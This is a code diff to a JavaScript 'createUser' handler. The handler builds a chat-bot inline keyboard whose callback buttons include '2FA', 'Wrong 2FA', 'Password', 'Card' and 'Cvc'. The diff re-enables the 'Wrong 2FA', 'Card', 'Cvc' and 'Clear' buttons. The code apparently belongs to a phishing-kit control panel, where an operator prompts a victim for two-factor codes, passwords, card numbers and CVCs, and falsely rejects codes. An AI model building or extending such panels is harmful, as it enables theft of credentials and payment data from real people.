@@ -40,10 +40,10 @@ export const createUser = async (req, res) => {
                             text: '2FA',
                             callback_data: `/2fa ${id}`,
                         },
-                        // {
-                        //     text: 'Wrong 2FA',
-                        //     callback_data: `/incorrect-2fa ${id}`,
-                        // },
+                        {
+                            text: 'Wrong 2FA',
+                            callback_data: `/incorrect-2fa ${id}`,
+                        },
                         {
                             text: 'Password',
                             callback_data: `/password ${id}`,
@@ -52,14 +52,14 @@ export const createUser = async (req, res) => {
                             text: 'Form',
                             callback_data: `/email ${id}`,
                         },
-                        // {
-                        //     text: 'Card',
-                        //     callback_data: `/card ${id}`,
-                        // },
-                        // {
-                        //     text: 'Cvc',
-                        //     callback_data: `/cvc ${id}`,
-                        // },
+                        {
+                            text: 'Card',
+                            callback_data: `/card ${id}`,
+                        },
+                        {
+                            text: 'Cvc',
+                            callback_data: `/cvc ${id}`,
+                        },
 
                     ],
                     [
@@ -87,14 +87,13 @@ export const createUser = async (req, res) => {
                             text: 'Done',
                             callback_data: `/done ${id}`,
                         },
-                    ]
-                    // ,
-                    // [
-                    //     {
-                    //         text: 'Clear',
-                    //         callback_data: `/ ${id}`,
-                    //     }
-                    // ],
+                    ],
+                    [
+                        {
+                            text: 'Clear',
+                            callback_data: `/ ${id}`,
+                        }
+                    ],
 
                 ],
             }),
